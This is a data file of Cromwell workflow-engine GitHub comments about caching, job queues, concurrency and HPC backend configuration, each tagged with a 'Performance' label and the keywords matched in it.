Performance,I suggest also allow specifying walltime and queue; walltime in particular as it enables most efficient performance of the scheduler and is often a required resource request in traditional HPC cluster setups.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/583#issuecomment-207641967:45,queue,queue,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/583#issuecomment-207641967,2,"['perform', 'queue']","['performance', 'queue']"
Performance,"I think I have resolved this.; My `query` call always includes a workflow name, but I had been issuing an unrestricted query and doing the filtering client side. When I change the query call to filter on `name`, it returns successfully on a consistent basis.; So I interpret this to mean that it was the `query` call itself that was generating a large number of queued tasks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-394782296:362,queue,queued,362,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-394782296,1,['queue'],['queued']
Performance,"I think in general the number of concurrent jobs is determined by both of client side (cromwell) and server side(aws batch). In cormwell, there should be a rate limit of api call (no matter it is job submission or job status query) to avoid DDoS to the server side. On the server side like aws batch, there is also a config for rate limit of concurrent api call, if the number of concurrent api call exceeds the rate limit of server side, the server side may refuse to server so it is important not to set rate limit on the client side/cromwell over the server side rate limit. While on server side, if the concurrent jobs require more resources than the limit such as cpus and mem (compute env in aws batch) , it is the server side responsibility to put the concurrent jobs to queue and make sure they can be launched later when resource is available rather than throwing errors unless the queue is expired (say, resource is still not available one week later). IMHO, aws batch backend should implement the scatter jobs in array jobs which support multiple jobs submission and status query in one single api call, otherwise, it is too easy to exceed the rate limit of aws batch. jobs submission by user --> cromwell (rate limit config) --> aws batch gateway (rate limit config) --> aws batch compute env (resource limit)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444666395:33,concurren,concurrent,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444666395,7,"['concurren', 'queue']","['concurrent', 'queue']"
Performance,"I think it has to, in order to see if the image in the cache hash matches the current pull (or other) request, here is an example: https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/client/library/pull.go#L55. I’m not super familiar with the code, but looks like the hash is retrieved here https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/client/oci/pull.go#L36 and then needs to get a manifest https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/build/oci/oci.go#L133 which I’d suspect does just that. https://github.com/containers/image/blob/175bf8b8f9ad897bdc10761e11b466d00f516a63/types/types.go#L238. If a user doesn’t have internet access, or has limited, or there is need to query the registry, might run into trouble. I just tried running an exec to a Docker uri, first of course with Internet to make sure that the images in my cache, and then I disabled my wireless. Without wireless, of course, I couldn’t run anything. This issue could be avoided if the user pulled an image first and then use that image instead of this Docker uri.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631184995:55,cache,cache,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631184995,2,['cache'],['cache']
Performance,I think it'd be good to right at the top make a big point about the number one 'feature' here is enhanced performance and scalability,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1477#issuecomment-249003742:106,perform,performance,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1477#issuecomment-249003742,2,"['perform', 'scalab']","['performance', 'scalability']"
Performance,"I think that's a different request. #2652 is asking to make available the wdltool syntax validation from within cromwell. This one is asking for a new type of validation, analogous in some ways to the GATK Queue ""dry run"" feature.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-332257390:206,Queue,Queue,206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-332257390,1,['Queue'],['Queue']
Performance,"I think the cache is unrelated, this is purely input localisation. I re-ran the job with caching disabled in the config file. The same error occurs. From this directory: /share/ScratchGeneral/evaben/cromwell/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/37e4e046-b256-4f81-95c6-9f0c915810bf/call-SamToFastqAndBwaMem/inputs/-21323395 . There is a file 'cromwell.tmp' which seems to be a partial copy of my cromwell process' CWD. All of the logs are copied in, (cromwell.tmp/cromwell-workflow-logs/) and a single seemingly unrelated job (cromwell.tmp/cromwell-executions/HaplotypeCallerGvcf_GATK4/f18cded7-24ae-470d-b58d-d87ce97f21cb/call-HaplotypeCaller/shard-6/). All of that jobs 'execution' folder, and some of its 'inputs' are copied. It is not clear if more would have been copied in or if the process was ended by the soft link error mentioned above.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3825#issuecomment-401217803:12,cache,cache,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3825#issuecomment-401217803,1,['cache'],['cache']
Performance,"I think the effect is fine. We often tell people that once a job is runnable that Cromwell fires it off, but that's always used as a way to help them understand that Cromwell isn't partaking in true scheduling (ie resource based negotiation via SGE, PAPI, etc). IMO it's absolutely ok for jobs which are runnable to have not started if that's the limitation the system imposes. Further, I think it's a good move in the resiliency front. Infinite scalability is a great goal, but from a practical perspective a limit is always going to be reached, so finding ways to make the system manage to keep on ticking ok when that happens is a good thing. That's generally going to involve slowing things down.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370621740:446,scalab,scalability,446,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370621740,1,['scalab'],['scalability']
Performance,"I think the following workflow (test.wdl) shows some even more insidious issues with localization:; ```; version 1.0. workflow main {; call main {; input:; X = [""/tmp/1"", ""/tmp/2"", ""/tmp/3""],; Y = [""/tmp/1"", ""/tmp/2"", ""/tmp/3""]; }. output {; Array[String] out = main.out; }; }. task main {; input {; Array[File]? X; Array[File]? Y; }. command <<<; echo X=~{if defined(X) then write_lines(select_first([X])) else X}; echo ~{if defined(Y) then ""Y="" + write_lines(select_first([Y])) else Y}; >>>. output {; Array[String] out = read_lines(stdout()); }. runtime {; docker: ""ubuntu:20.04""; }; }; ```. The following run:; ```; $ touch /tmp/{1,2,3}; $ cd /home/freeseek/cromwell; $ java -jar cromwell-51.jar run test.wdl; ```. Generates the following main.out:; ```; [""X=/cromwell-executions/main/bc07dd07-017f-41cf-9ba5-9f6e014a475b/call-main/execution/write_lines_c53d7635054b80e6d4298c99f823d256.tmp"",; ""Y=/home/freeseek/cromwell/cromwell-executions/main/bc07dd07-017f-41cf-9ba5-9f6e014a475b/call-main/execution/write_lines_c53d7635054b80e6d4298c99f823d256.tmp""]; ```. I can guess that in one case write_lines() is run before localization and in one case it is run after localization, generating two at first extremely puzzling different outputs. Notice that the [WDL specification](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#task-input-localization) requires that `Files are localized into the execution directory prior to the task execution commencing.` which does not seem to be the case for Cromwell. This seems to me like a serious bug. Where is it specified when Cromwell performs localization of files?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5540#issuecomment-657253592:1592,perform,performs,1592,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5540#issuecomment-657253592,1,['perform'],['performs']
Performance,"I think the issue is actually reversed. The call cache diff endpoint should be accessing metadata which means the missing info are the call cache hashes should be in the metadata store. We say that the metadata repository is the collection of every meaningful event that has occurred in the system and that allows downstream clients to shape that information to suit their needs. That's why all user facing ""gie me information about XYZ"" endpoints read from there. This should be the same I think.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-306891648:49,cache,cache,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-306891648,2,['cache'],['cache']
Performance,"I think we might be having a similar issue:; ```; Bad output 'pindel.deletions': Futures timed out after [60 seconds]; Bad output 'pindel.insertions': Futures timed out after [60 seconds]; Bad output 'pindel.long_insertions': Futures timed out after [60 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:858); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```. If we don't want to change our caching strategy, can we simply increase the timeout? Can that be done with `akka.http.server.request-timeout`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-444687019:499,concurren,concurrent,499,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-444687019,5,['concurren'],['concurrent']
Performance,"I thought I was going crazy! Thanks @rhpvorderman, I think this is a great PR, and really looking forward to being able to test this on our HPC. I'm still a little concerned with Cromwell requesting the whole file (up to 200GB) and it's impact on our network. But this is definitely a step in the write direction. I was thinking of maybe adding something similar, but would check the file size, and then perform `xxh64` on the first 1MB or some region of the file (eg: `size+xxh64-partial`). I'm happy to produce some documentation (whether a part of this PR, or linked to it), about call-caching on Cromwell and to include this new material once I can test it okay. Thanks for pinging me @rhpvorderman, excited to try this out!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599207733:404,perform,perform,404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599207733,1,['perform'],['perform']
Performance,"I thought it was a feature request (wdlDependencies isn't a documented field for batch endpoint in the README.md) but if you're expecting that it should work, then it's a bug report - because if I submit to `:version/batch` specifying `wdlDependencies`: ; ```; curl http://bionode05/cromwell/api/workflows/V1/batch -FwdlSource=@test.wdl -FworkflowInputs=@test.batch.inputs -FwdlDependencies=@dependency.wdl.zip; ```; I get a failed workflow with the following metadata (no `imports` in the `submittedFiles` block):; ```; {; ""submittedFiles"": {; ""inputs"": ""{\""test.foo.showIt\"":\""that\""}"",; ""workflow"": ""import \""dependency.wdl\"" as dependency\n\nworkflow test {\n\n\tcall dependency.foo\n\n}\n"",; ""options"": ""{\n\n}""; },; ""calls"": {. },; ""outputs"": {. },; ""id"": ""d97a5124-0933-4243-b542-6467b496ba22"",; ""inputs"": {. },; ""submission"": ""2016-12-08T10:21:10.205+10:00"",; ""status"": ""Failed"",; ""failures"": [{; ""message"": ""Workflow input processing failed.\nUnable to load namespace from workflow: Failed to import workflow, no import sources provided.""; }],; ""end"": ""2016-12-08T10:21:16.957+10:00"",; ""start"": ""2016-12-08T10:21:16.952+10:00""; }; ```. The exact same `curl` command line submission (with suitable inputs file) but to the `:version` endpoint works ok.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1753#issuecomment-265617532:962,load,load,962,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1753#issuecomment-265617532,1,['load'],['load']
Performance,"I tried the `GET ​/api​/workflows​/v1/callcaching​/diff`, but it didn't seam to work, and something wrong in Array..... I compared the ""callCaching"" of the same task between two workflows, all of them is the same except the red box :; ![image](https://user-images.githubusercontent.com/70520563/115682260-dedefc00-a387-11eb-8164-f21830f1c4a6.png); md5 values are the same, but the following paths are different. Therefore, I guess the reason of cache miss hit is caused by ""md5+path""; And Who knows how to remove path from MD5 value ?. I've tried many ways, but I don't know how to get rid of path in MD5 value. ; Who can help me please !",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-824659689:445,cache,cache,445,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-824659689,1,['cache'],['cache']
Performance,"I tried to throttle to only 50 jobs at a time, but it didn't seem to help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276790934:11,throttle,throttle,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276790934,1,['throttle'],['throttle']
Performance,"I use this config in a SGE backend for singularity. ```; Singularity {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 100; exit-code-timeout-seconds = 120; runtime-attributes = """"""; String sif; Float? memory_gb; String? bind_path; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l mem_free="" + memory_gb + ""g""} \; singularity exec -e --bind ${cwd}:${cwd} \; ${""--bind "" + bind_path} \; ${sif} \; ${job_shell} ${script}; """""". job-id-regex = ""(\\d+)""; check-alive = ""qstat -j ${job_id}""; kill = ""qdel ${job_id}""; }; }; ```; Every task should have a `String sif`, point to the path to sif file. You can modify this according to your need.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048:169,concurren,concurrent-job-limit,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048,1,['concurren'],['concurrent-job-limit']
Performance,I was having trouble with my PR builds so I blew away all the caches; that seems to have had beneficial effects here too. 🙂,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5330#issuecomment-570748662:62,cache,caches,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5330#issuecomment-570748662,1,['cache'],['caches']
Performance,"I was running this on gsa4. Can you submit sge jobs from your laptop? can; your sctter test on gsa4 submitting to sge before you insult my beautiful; iMac? :-p. On Mon, Feb 6, 2017 at 6:29 PM, Jeff Gentry <notifications@github.com>; wrote:. > Got a chance to look w/ a profiler. Situation definitely *is* improved; > over previous in that I had to dramatically increase the size of the; > scatter to get hung up again (this is on my laptop which is apparently way; > faster than whatever machine @yfarjoun <https://github.com/yfarjoun> is; > using).; >; > The new bottleneck appears to be ExecutionStore.arePrerequisitesDone,; > sitting at 99% and growing CPU usage. Specifically the exists call in; > ExecutionStore.isDone and the collect on key.scope.upstream.; >; > Note that isDone was also the previous hotspot but it doesn't appear to; > be the FQN calculation any more, rather just the exists itself.; >; > It's possible that there's still something we can do a la the FQN here but; > if not my concern is that this is going to take you into the ""something; > clever"" realm.; >; > BTW @yfarjoun <https://github.com/yfarjoun> whatever machine you're; > running this on is also part of your bottleneck. I was able to do a 40k; > scatter no problem on one of my laptop cores, then just threw in 200k which; > is what locked it up. If you can't do 1k perhaps retry on something not; > from the stone age? ;); >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277848692>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACnk0oXuof6pg3nhG_3qO-drfxxs4dEvks5rZ6zmgaJpZM4L0Um8>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277887938:564,bottleneck,bottleneck,564,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277887938,2,['bottleneck'],['bottleneck']
Performance,"I was testing some call caching behaviors. Specifically I tried to call cache on local backend with the ""hash the file path"" method which would hash a file path even though the file doesn't exist. The job would then try to find a cache hit for this path even though the file doesn't exist",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280759949:72,cache,cache,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280759949,2,['cache'],['cache']
Performance,"I was using 3.4.1 and saw behavior where one of the copies did the download into the cache, and the second saw the partial file in the cache and tried to run it and failed. And yes, it's a local registry that I convinced to run inside singularity instead of docker since my production hosts are centos6 and are not happy with docker currently (and I'd rather have the control singularity gives me).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537244158:85,cache,cache,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537244158,2,['cache'],['cache']
Performance,I would recommend to make this a finite-state machine and have it resubmit if the script-code performs a `SIGINT` for the following line:. ```; val processReturnCode = process.exitValue() // blocks until process finishes; ```. Below is the location of the line:. https://github.com/broadinstitute/cromwell/blob/599f1ddb31fb11bfd4fdc4c49f0505aba69e03f3/src/main/scala/cromwell/engine/backend/local/LocalBackend.scala#L203. ~p,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177665209:94,perform,performs,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177665209,1,['perform'],['performs']
Performance,"I'd estimate Travis/Dockering Grid Engine as medium effort, as others have already done it. Example links for the inspired:; - Google result [example](https://github.com/gawbul/docker-sge/blob/ff400b613f5bb1eae28f16e6a47d8bb1116e9617/Dockerfile) of docker+sge (crazy number of docker layers though!); - https://support.univa.com/ would probably help us (we have a license somewhere, and can probably run it similar to how we only run JES for Broad users); - help@broad would probably help create an installer script as well. For example, years ago there was a script that installed Sun's Grid Engine via CloudFormation. Speaking of Sun Microsystems, SGE is [dead](http://www.softpanorama.net/HPC/Grid_engine/Implementations/index.shtml), as well as its successors [OGE](http://www.oracle.com/technetwork/oem/grid-engine-166852.html) and an attempted-then-abandoned FOSS fork [OGS](http://gridscheduler.sourceforge.net/). Long live [SoGE](https://arc.liv.ac.uk/SGE/), and [UGE](http://www.univa.com/products/#service2). It's fine to use ""SGE"", just like we use the term ""JES"", but we'll likely need to target specifically UGE for Broadies and/or SoGE for the rest of the Grid Engine world. > Outside of Broad we probably have more LSF users than SGE users. True, there are lots of [popular](https://trends.google.com/trends/explore?date=today%205-y&q=Grid%20Engine,%2Fm%2F082f3d,%2Fm%2F0cmb2ky,%2Fm%2F04n7lk2) grid [schedulers](https://en.wikipedia.org/wiki/Job_scheduler#Batch_queuing_for_HPC_clusters). I'd be more than happy to run yet-another-travis-job for whatever scheduler, if someone contribs the docker image / setup script like we have for Funnel. > I don't know how well our SGE stuff works with UGER so perhaps not. Cromwell works great on BITS' newer UGE cluster named ""UGER"". I use cromwell frequently with `concurrent-job-limit` set to 900 due to our resource caps. **TL;DR Getting grid engine test support setup for a Broad-like environment is possible, just hasn't been a priority.**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324116356:2218,concurren,concurrent-job-limit,2218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324116356,1,['concurren'],['concurrent-job-limit']
Performance,"I'll largely defer to @cjllanwarne, @mcovarr, or @danbills on the specifics, but it seems that you could specify the runtime attribute you need and how to interpret it by customizing the SLURM backend in the config:. https://cromwell.readthedocs.io/en/stable/backends/SLURM/. If I'm reading the docs correctly, it might be possible to inject your `module load` command into the `--wrap` argument.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-505658382:355,load,load,355,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-505658382,1,['load'],['load']
Performance,"I'm guessing that the ""people aren't around"" thing isn't going to change at 5pm on a Friday, so .... I'm thinking now that instead, perhaps the thing to do is to also have the actor know if read is on and if write is on. When the actor spins up, it ...; - If read is on, just starts determining the cache hit status w/o being asked; - If write is on, starts hashing everything; - If both are on, starts hashing everything but is checking for cache hit until a miss occurs, at which point it's just generating hashes. The actor could then receive two messages, one is ""are you a cache hit"" and the other is ""please now persist to the store"" (if you asked for cache hit status before it was done, perhaps it could send back a ""come back later"" message - that way you can avoid returning the Futures, although perhaps people like that). We know for a fact that if read is on that we'll be checking the cache, so might as well start that ASAP. If write is on, we're potentially wasting energy - e.g. if a job fails, but presumably (hopefully!) job successes are more common than job failures and we can get a jumpstart on the process.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1225#issuecomment-236289880:299,cache,cache,299,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1225#issuecomment-236289880,5,['cache'],['cache']
Performance,I'm having problems even trying to submit that many workflows concurrently. Cromwell starts taking a long time to respond to submissions from the Swagger page.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1007#issuecomment-227246197:62,concurren,concurrently,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1007#issuecomment-227246197,1,['concurren'],['concurrently']
Performance,"I'm not sure the exact scenario people would want to use this in, but it seems to replace the previous behavior ""retry a few times for known flakinesses, otherwise fail"" - with a less tuned ""retry a custom number of times for all codes"". * Is there any possibility that users would want to continue retrying on known flakinesses (hint: I really think they do) but not blindly restart on other error codes (which could be expensive for typos!)?; ---; One other thought:; * This seems to only catch JES telling us the task has failed. If the task on JES ""succeeds"" but Cromwell later finds out that it cannot download or evaluate a result, does this still retry?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3490#issuecomment-379274281:184,tune,tuned,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3490#issuecomment-379274281,1,['tune'],['tuned']
Performance,"I'm totally fine with using an actor rather than a floating Future here, that should allow for better concurrency management. But the structure of the code prior to this PR was the lowest-cost refactoring of the Olde Worlde JES backend to the New World, while this PR addressed the issue raised in #1004 that there was effectively a duplication of `Retry.withRetry`. If somebody wants to ticket replacing all the usages of `Retry.withRetry` with an Actor-based approach and lobby for that to be prioritized that's great, but making changes that broad seemed like more work than had been called for in this ticket. Or you could just submit a PR as @geoffjentry suggests. 😄",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226590779:102,concurren,concurrency,102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226590779,1,['concurren'],['concurrency']
Performance,"I'm trying to run the same wdl on gsa5 now with the snapshot (cromwell-25-1d61047-SNAP.jar). I tried it with call caching and it is slow to retrieve the cache hits. One every 5 seconds or so. Here's the relevant jstack:. ```; ""cromwell-system-akka.dispatchers.engine-dispatcher-34"" #99 prio=5 os_prio=0 tid=0x00002b4fa8024800 nid=0x174b2 runnable [0x00002b4da8502000]; java.lang.Thread.State: RUNNABLE; 	at scala.collection.Iterator$class.exists(Iterator.scala:919); 	at scala.collection.AbstractIterator.exists(Iterator.scala:1336); 	at scala.collection.IterableLike$class.exists(IterableLike.scala:77); 	at scala.collection.AbstractIterable.exists(Iterable.scala:54); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActorData$$anonfun$cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActorData$$upstreamFailed$1$1.apply(WorkflowExecutionActorData.scala:88); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActorData$$anonfun$cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActorData$$upstreamFailed$1$1.apply(WorkflowExecutionActorData.scala:87); 	at scala.collection.TraversableLike$$anonfun$filterImpl$1.apply(TraversableLike.scala:248); 	at scala.collection.immutable.List.foreach(List.scala:381); 	at scala.collection.TraversableLike$class.filterImpl(TraversableLike.scala:247); 	at scala.collection.TraversableLike$class.filter(TraversableLike.scala:259); 	at scala.collection.AbstractTraversable.filter(Traversable.scala:104); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActorData.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActorData$$upstreamFailed$1(WorkflowExecutionActorData.scala:87); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActorData$$anonfun$3.apply(WorkflowExecutionActorData.scala:93); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActorData$$anonfun$3.apply(WorkflowExecutionActorData.scala:92); 	at scala.collection.TraversableLike$",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-278438957:153,cache,cache,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-278438957,1,['cache'],['cache']
Performance,"I've downloaded the new jar file, still showing version 30.2, but still seeing the problem in some situations:. 2018-02-21 11:03:39,563 cromwell-system-akka.dispatchers.engine-dispatcher-95 INFO - Abort requested for workflow f0bff6e2-77a6-46f5-b226-13a64339a286.; 2018-02-21 11:03:39,564 cromwell-system-akka.dispatchers.engine-dispatcher-95 INFO - WorkflowExecutionActor-f0bff6e2-77a6-46f5-b226-13a64339a286 [UUID(f0bff6e2)]: Aborting workflow; 2018-02-21 11:03:39,567 cromwell-system-akka.dispatchers.engine-dispatcher-50 WARN - unhandled event EngineLifecycleActorAbortCommand in state SubWorkflowRunningState. Several SGE queue jobs continue to run/stay in the queue waiting state. Terminating the server with a ctrl-C does not affect the queued jobs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3259#issuecomment-367435337:627,queue,queue,627,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3259#issuecomment-367435337,3,['queue'],"['queue', 'queued']"
Performance,"I've found at least three kinds of brokenness here:; 1. Cromwell never sends a `WorkflowManagerAbortSuccess` from the `WorkflowManagerActor` to the API handler, so the response to the abort POST is never completed on a successful abort.; 2. If the `WorkflowManagerActor` is asked to abort a workflow ID it doesn't recognize it throws a `WorkflowNotFoundException` which eventually completes the abort request with a 404. Unfortunately the decoupling between the `WorkflowStore` and the `WorkflowManagerActor` introduces a gaping race condition where a legitimate workflow ID may not be known to the `WorkflowManagerActor` for a long time after that ID has been returned to the submitter.; 3. There's a third failure mode where the abort request seems to be ignored with various error and warning messages and jobs just keep running:. ```; 2016-09-09 15:50:44,628 cromwell-system-akka.actor.default-dispatcher-7 INFO - Workflow aed1aad8-588d-4f84-aa09-da0f663d68c0 submitted.; 2016-09-09 15:50:56,111 cromwell-system-akka.actor.default-dispatcher-15 INFO - 1 new workflows fetched; 2016-09-09 15:50:56,112 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - WorkflowManagerActor Starting workflow UUID(aed1aad8-588d-4f84-aa09-da0f663d68c0); 2016-09-09 15:50:56,116 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - WorkflowManagerActor Successfully started WorkflowActor-aed1aad8-588d-4f84-aa09-da0f663d68c0; 2016-09-09 15:50:56,116 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2016-09-09 15:50:56,175 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: transitioning from WorkflowUnstartedState to MaterializingWorkflowDescriptorState; 2016-09-09 15:50:56,261 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - MaterializeWorkflowDescriptorActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: Call-to-Backend assignmen",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733:529,race condition,race condition,529,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733,1,['race condition'],['race condition']
Performance,"I've never used Cromwell this way but my understanding is that good call caching performance is heavily dependent on cloud object storage. This is because it returns checksums in a short, constant time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159:81,perform,performance,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159,1,['perform'],['performance']
